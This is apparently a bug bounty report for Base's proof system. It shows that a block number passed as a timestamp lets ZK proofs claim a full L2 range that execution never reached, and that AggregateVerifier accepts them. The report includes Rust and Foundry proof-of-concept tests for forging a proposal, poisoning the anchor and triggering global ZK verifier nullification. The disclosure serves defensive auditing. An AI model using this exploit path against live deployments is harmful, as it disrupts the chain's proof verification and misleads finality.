# 76470 bc medium short zk range proof can be accepted as a full aggregateverifier interval and trigger global zk verifier nullification

**Submitted on May 4th 2026 at 15:34:20 UTC by @joohhnnn8 for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #76470
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * A bug in the respective layer 0/1/2 network code that results in unintended smart contract behavior with no concrete funds at direct risk
  * Forging or bypassing TEE or ZK proof verification in AggregateVerifier to finalize an invalid state root on L1

## Description

## Brief/Intro

The ZK proof client can stop early after `EndOfSource`, but still publish public values that claim the full target range was proven. `AggregateVerifier` accepts this as a valid ZK proposal because the claimed ending block/root and intermediate roots are not tied to the actual block reached by execution.

This lets an attacker create a ZK-valid but semantically invalid AggregateVerifier game. If honest challengers correct it through the ZK nullification path, the shared ZK verifier is globally nullified, so future ZK games using that verifier revert until Base recovers the ZK path or relies on the TEE path. If the malformed game is not challenged, it can temporarily poison the anchor with an early root labeled as a later L2 block, although this anchor state can be overtaken by a parallel honest game chain.

## Vulnerability Details

The issue starts in `advance_to_target`.

When the derivation pipeline returns `PipelineError::EndOfSource`, the code tries to make this fatal after Isthmus. The check uses the L2 block number as the input to `is_isthmus_active`:

```rust
if cfg.is_isthmus_active(driver.cursor.read().l2_safe_head().block_info.number) {
    return Err(PipelineError::EndOfSource.crit().into());
}
```

`is_isthmus_active` expects a timestamp. Base L2 block numbers are much smaller than the Isthmus activation timestamp, so this check returns false even after Isthmus. The `EndOfSource` error is swallowed, and the driver returns the current safe head instead of failing.

The public values then use the claimed target block number/root, not the actual block reached by execution:

```rust
l2BlockNumber: boot_info.claimed_l2_block_number,
l2PostRoot: boot_info.claimed_l2_output_root,
```

An attacker can use a private intermediate interval of `1` so the short execution still provides the number of intermediate roots expected by the on-chain game. The result is an accepted `AggregateVerifier` game with:

* `l2SequenceNumber = startingBlock + BLOCK_INTERVAL`
* `rootClaim = output root from an earlier safe head`
* `intermediateRoots = early roots sampled every 1 block`

This is not the same as submitting a random invalid proof. A random invalid proof reverts. Here, the ZK proof can be accepted because the ZK program and the on-chain verifier disagree about what block range the proof represents.

## Impact Details

Selected impacts:

`A bug in the respective layer 0/1/2 network code that results in unintended smart contract behavior with no concrete funds at direct risk.`

`Forging or bypassing TEE or ZK proof verification in AggregateVerifier to finalize an invalid state root on L1.`

The unintended behavior is that `AggregateVerifier` accepts a ZK proposal that claims a full range while the ZK execution only reached a shorter range.

I self-rate this as Medium because the invalid-anchor path is challengeable and recoverable, and this report does not claim direct fund loss, total shutdown, or permanent bridge freezing. The persistent impact is that the normal permissionless correction path globally nullifies the shared ZK verifier.

There are two relevant outcomes:

1. If honest challengers are running, they can catch the mismatch at the first intermediate checkpoint and call `nullify()`. This prevents the malformed proposal from finalizing, but it also sets the shared ZK verifier to `nullified`. After that, new ZK games using the same verifier revert with `Nullified()`. Base has to rely on the TEE path or recover the ZK verifier/game configuration.
2. If the proposal is not challenged before finalization, it can resolve as `DEFENDER_WINS` and temporarily update the anchor to an early output root under the full claimed L2 block number. This does not create permanent fund freezing: an honest proposer can build a parallel correct game chain from the starting anchor and eventually overtake the poisoned anchor with a higher L2 block number.

This report does not claim direct fund loss, total chain shutdown, or permanent bridge freezing. The issue is that an attacker can create a semantically invalid ZK proposal that should not be accepted, and the normal permissionless correction path globally disables the ZK verifier until recovery.

## References

* `base/base`: `crates/proof/succinct/utils/client/src/client.rs`
* `base/base`: `crates/proof/succinct/utils/client/src/boot.rs`
* `base/base`: `crates/proof/succinct/programs/aggregation/src/main.rs`
* `base/contracts`: `src/multiproof/AggregateVerifier.sol`
* `base/contracts`: `src/multiproof/Verifier.sol`

## Proof of Concept

This PoC has two parts:

{% stepper %}
{% step %}

## Part 1: ZK client stops early but keeps the claimed target block

In the scoped `base/base` repo, add a regression test under:

```
crates/proof/succinct/utils/client/tests/end_of_source_label_mismatch.rs
```

The test uses a finite mock derivation pipeline. The pipeline can produce a small number of payloads, then returns `PipelineError::EndOfSource`.

The important test body is:

```rust
#[tokio::test]
async fn private_interval_one_can_fill_contract_root_count_before_end_of_source() {
    let rollup = Registry::rollup_config(8453).expect("base mainnet config").clone();
    let l1_config = L1_CONFIGS.get(&rollup.l1_chain_id).expect("base l1 config").clone();
    let post_isthmus_timestamp = rollup.hardforks.isthmus_time.expect("isthmus timestamp");

    let safe_head_number = 30_000_000;
    let safe_head = L2BlockInfo {
        block_info: BlockInfo::new(
            B256::from([1; 32]),
            safe_head_number,
            B256::from([2; 32]),
            post_isthmus_timestamp,
        ),
        l1_origin: BlockNumHash { number: 1, hash: B256::from([3; 32]) },
        seq_num: 0,
    };
    let safe_head_output_root = B256::from([4; 32]);

    let onchain_block_interval = 600;
    let onchain_intermediate_interval = 30;
    let expected_contract_roots = onchain_block_interval / onchain_intermediate_interval;
    let claimed_l2_block_number = safe_head_number + onchain_block_interval;

    assert!(rollup.is_isthmus_active(safe_head.block_info.timestamp));
    assert!(!rollup.is_isthmus_active(safe_head.block_info.number));

    let mut driver = seeded_finite_driver(
        rollup.clone(),
        safe_head,
        safe_head_output_root,
        expected_contract_roots,
    );

    let (actual_safe_head, output_root, intermediate_roots) =
        advance_to_target(&mut driver, &rollup, Some(claimed_l2_block_number), 1)
            .await
            .unwrap();

    assert_eq!(actual_safe_head.block_info.number, safe_head_number + expected_contract_roots);
    assert_eq!(output_root, root_for_block(actual_safe_head.block_info.number));
    assert_eq!(intermediate_roots.len() as u64, expected_contract_roots);
    assert_eq!(intermediate_roots[0], root_for_block(safe_head_number + 1));

    let boot = BootInfo {
        l1_head: B256::from([1; 32]),
        agreed_l2_output_root: safe_head_output_root,
        claimed_l2_output_root: output_root,
        claimed_l2_block_number,
        chain_id: 8453,
        rollup_config: rollup,
        l1_config,
        proposer: Address::ZERO,
        intermediate_block_interval: 1,
        l1_head_number: 1,
    };

    let public_values =
        BootInfoStruct::new(boot, safe_head_number, intermediate_roots);

    assert_eq!(public_values.l2PreBlockNumber, safe_head_number);
    assert_eq!(public_values.l2BlockNumber, claimed_l2_block_number);
    assert_eq!(public_values.l2PostRoot, output_root);
    assert_eq!(public_values.intermediateRoots.len() / 32, expected_contract_roots as usize);
}
```

What this proves:

* The chain is post-Isthmus by timestamp.
* The current code checks Isthmus activation using the block number, so the post-Isthmus `EndOfSource` path does not fail.
* The mock execution only reaches `safe_head + 20`.
* The public values still claim `safe_head + 600`.
* The number of intermediate roots matches what the on-chain contract expects for a 600-block game with 30-block checkpoints.

Run:

```bash
cargo test -p base-proof-succinct-client-utils --test end_of_source_label_mismatch -- --nocapture
```

Expected result:

```
running 4 tests
test end_of_source_is_swallowed_when_post_isthmus_block_number_is_used_as_timestamp ... ok
test boot_info_struct_commits_claimed_block_not_actual_execution_block ... ok
test private_interval_one_can_fill_contract_root_count_before_end_of_source ... ok
test honest_first_checkpoint_nullify_proof_has_matching_public_values ... ok

test result: ok. 4 passed
```

The fourth test is a control for the challenge path. It shows that an honest proof for the first checkpoint has public values that match the on-chain `nullify(index=0)` call.
{% endstep %}

{% step %}

## Part 2: AggregateVerifier accepts the malformed proposal

In the scoped `base/contracts` repo, add a Foundry test under:

```
test/multiproof/EndOfSourceLabelMismatch.t.sol
```

The test uses the existing `BaseTest` setup and `MockVerifier`. The mock verifier is used only to check that `AggregateVerifier` builds and verifies the expected journal. The root values are synthetic, but the contract flow is real.

The main test is:

```solidity
function testZKInitializationAcceptsEarlyRootsLabeledAsFullInterval() public {
    uint256 rootsCount = BLOCK_INTERVAL / INTERMEDIATE_BLOCK_INTERVAL;
    uint256 claimedEndingBlock = currentL2BlockNumber + BLOCK_INTERVAL;
    uint256 actualEndingBlock = currentL2BlockNumber + rootsCount;

    bytes memory earlyRoots = _generateOneBlockSpacedRoots(actualEndingBlock);
    bytes32 earlyEndingRoot = _actualOutputRoot(actualEndingBlock);
    bytes memory initProof = _buildZkInitProofAndExpectCall(
        earlyEndingRoot,
        claimedEndingBlock,
        earlyRoots
    );

    AggregateVerifier game = _createAggregateVerifierGameWithRoots(
        ZK_PROVER,
        Claim.wrap(earlyEndingRoot),
        claimedEndingBlock,
        earlyRoots,
        initProof
    );

    assertEq(game.zkProver(), ZK_PROVER);
    assertEq(game.l2SequenceNumber(), claimedEndingBlock);
    assertEq(game.rootClaim().raw(), earlyEndingRoot);
    assertEq(game.intermediateOutputRoot(0), _actualOutputRoot(1));
    assertEq(game.intermediateOutputRoot(rootsCount - 1), earlyEndingRoot);

    vm.warp(block.timestamp + 7 days);
    game.resolve();
    assertEq(uint8(game.status()), uint8(GameStatus.DEFENDER_WINS));

    vm.warp(block.timestamp + 1);
    game.closeGame();

    (Hash anchoredRoot, uint256 anchoredBlockNumber) = anchorStateRegistry.getAnchorRoot();
    assertEq(anchoredRoot.raw(), earlyEndingRoot);
    assertEq(anchoredBlockNumber, claimedEndingBlock);
}
```

What this proves:

* The game claims the full on-chain block interval.
* The root claim is actually the output root of an early block.
* `AggregateVerifier` accepts the ZK proposal.
* If the game is not challenged, it can resolve and update the anchor with the early root under the full claimed block number.

## Honest challenge at the first checkpoint

The malformed proposal is not unchallengeable. The first intermediate root is already wrong.

In the test setup:

* The malformed proposal stores root for block `1` at index `0`.
* The contract expects index `0` to correspond to the first checkpoint, block `INTERMEDIATE_BLOCK_INTERVAL`.

The challenge test is:

```solidity
function testHonestFirstCheckpointProofCanNullifyForgedGame() public {
    uint256 rootsCount = BLOCK_INTERVAL / INTERMEDIATE_BLOCK_INTERVAL;
    uint256 claimedEndingBlock = currentL2BlockNumber + BLOCK_INTERVAL;
    uint256 actualEndingBlock = currentL2BlockNumber + rootsCount;

    bytes memory earlyRoots = _generateOneBlockSpacedRoots(actualEndingBlock);
    bytes32 earlyEndingRoot = _actualOutputRoot(actualEndingBlock);
    bytes memory initProof = _buildZkInitProofAndExpectCall(
        earlyEndingRoot,
        claimedEndingBlock,
        earlyRoots
    );

    AggregateVerifier game = _createAggregateVerifierGameWithRoots(
        ZK_PROVER,
        Claim.wrap(earlyEndingRoot),
        claimedEndingBlock,
        earlyRoots,
        initProof
    );

    bytes32 firstHonestCheckpointRoot = _actualOutputRoot(INTERMEDIATE_BLOCK_INTERVAL);
    assertEq(game.intermediateOutputRoot(0), _actualOutputRoot(1));
    assertNotEq(game.intermediateOutputRoot(0), firstHonestCheckpointRoot);

    address honestProver = makeAddr("honest-first-checkpoint-nullifier");
    bytes memory verifierProofBytes = abi.encodePacked("zk-proof-for-first-honest-checkpoint");

    _expectZkNullifyCall(
        game,
        honestProver,
        verifierProofBytes,
        anchorStateRegistry.getStartingAnchorRoot().root.raw(),
        0,
        firstHonestCheckpointRoot
    );

    vm.prank(honestProver);
    game.nullify(
        abi.encodePacked(uint8(AggregateVerifier.ProofType.ZK), verifierProofBytes),
        0,
        firstHonestCheckpointRoot
    );

    assertTrue(zkVerifier.nullified());
    assertEq(game.proofCount(), 0);
    assertEq(game.expectedResolution().raw(), type(uint64).max);
}
```

What this proves:

* Honest challengers can catch the malformed proposal immediately.
* The correction path works.
* The correction path sets the shared ZK verifier to `nullified`.

This is why I am not claiming an unchallengeable invalid root.

## Global ZK verifier impact

The relevant impact is what happens after the honest correction. The ZK verifier is shared, so nullifying it affects later ZK proposals too.

```solidity
function testNullifyingForgedGameGloballyDisablesNewZkGames() public {
    _createForgedGameAndNullifyAtFirstCheckpoint();
    assertTrue(zkVerifier.nullified());

    uint256 nextClaimedEndingBlock = currentL2BlockNumber + BLOCK_INTERVAL;
    bytes memory correctRoots = _generateIntervalSpacedRoots(nextClaimedEndingBlock);
    bytes32 correctEndingRoot = _actualOutputRoot(nextClaimedEndingBlock);
    bytes memory proof = _buildZkInitProofAndExpectCall(
        correctEndingRoot,
        nextClaimedEndingBlock,
        correctRoots
    );

    vm.deal(ZK_PROVER, INIT_BOND);
    vm.prank(ZK_PROVER);
    vm.expectRevert(bytes4(keccak256("Nullified()")));
    factory.createWithInitData{ value: INIT_BOND }(
        AGGREGATE_VERIFIER_GAME_TYPE,
        Claim.wrap(correctEndingRoot),
        abi.encodePacked(uint256(nextClaimedEndingBlock), address(anchorStateRegistry), correctRoots),
        proof
    );
}
```

Control test:

```solidity
function testNullifyingForgedGameDoesNotDisableTeeGames() public {
    _createForgedGameAndNullifyAtFirstCheckpoint();
    assertTrue(zkVerifier.nullified());
    assertFalse(teeVerifier.nullified());

    uint256 nextClaimedEndingBlock = currentL2BlockNumber + BLOCK_INTERVAL;
    Claim correctEndingRoot = Claim.wrap(_actualOutputRoot(nextClaimedEndingBlock));
    bytes memory teeProof = _buildTeeInitProofAndExpectCall(
        correctEndingRoot.raw(),
        nextClaimedEndingBlock
    );

    AggregateVerifier teeGame = _createAggregateVerifierGame(
        TEE_PROVER,
        correctEndingRoot,
        nextClaimedEndingBlock,
        address(anchorStateRegistry),
        teeProof
    );

    assertEq(teeGame.teeProver(), TEE_PROVER);
    assertEq(teeGame.l2SequenceNumber(), nextClaimedEndingBlock);
}
```

What this proves:

* After honest nullification, new ZK games revert with `Nullified()`.
* The issue affects the ZK path globally.
* TEE remains available, so this is not a full system halt.

## Anchor poisoning is recoverable, but still creates disruption

This PoC does not claim permanent fund freezing. The following regression test shows the recovery path.

```solidity
function testPoisonedAnchorCanBeOverwrittenByParallelCorrectChain() public {
    uint256 firstEndingBlock = currentL2BlockNumber + BLOCK_INTERVAL;
    AggregateVerifier attackGame = _createForgedGame(firstEndingBlock);
    AggregateVerifier correctFirstGame = _createCorrectFirstGame(firstEndingBlock);

    vm.warp(block.timestamp + 7 days);
    attackGame.resolve();
    correctFirstGame.resolve();

    vm.warp(block.timestamp + 1);
    attackGame.closeGame();
    correctFirstGame.closeGame();

    (Hash anchoredRoot, uint256 anchoredBlockNumber) = anchorStateRegistry.getAnchorRoot();
    assertEq(anchoredRoot.raw(), attackGame.rootClaim().raw());
    assertEq(anchoredBlockNumber, firstEndingBlock);
    assertNotEq(anchoredRoot.raw(), correctFirstGame.rootClaim().raw());

    AggregateVerifier correctChildGame = _createCorrectChildGame(correctFirstGame);

    vm.warp(block.timestamp + 7 days);
    correctChildGame.resolve();

    vm.warp(block.timestamp + 1);
    correctChildGame.closeGame();

    (anchoredRoot, anchoredBlockNumber) = anchorStateRegistry.getAnchorRoot();
    assertEq(anchoredRoot.raw(), correctChildGame.rootClaim().raw());
    assertEq(anchoredBlockNumber, correctChildGame.l2SequenceNumber());
}
```

What this proves:

* A malformed game can temporarily become the anchor if it is not challenged.
* A same-height correct game cannot overwrite it immediately, because `setAnchorState` requires a strictly higher L2 block number.
* An honest proposer can build a parallel correct chain from the old starting anchor, create a higher-block child game, and overtake the poisoned anchor.
* Therefore this is not permanent bridge freezing. The persistent impact is the ZK verifier nullification path, and the unchallenged path causes delay/recovery work rather than permanent loss.
  {% endstep %}
  {% endstepper %}

## Summary

The tests show:

1. `EndOfSource` is swallowed after Isthmus because the code passes block number instead of timestamp to `is_isthmus_active`.
2. The ZK public values can claim the full target block while execution stopped early.
3. `AggregateVerifier` accepts the malformed proposal.
4. If challenged, the proposal is corrected, but the shared ZK verifier is globally nullified.
5. New ZK games then revert with `Nullified()`, while TEE remains available.
6. If unchallenged, the malformed proposal can temporarily update the anchor.
7. The poisoned anchor can be overtaken by a parallel honest chain, so this is not permanent bridge freezing.
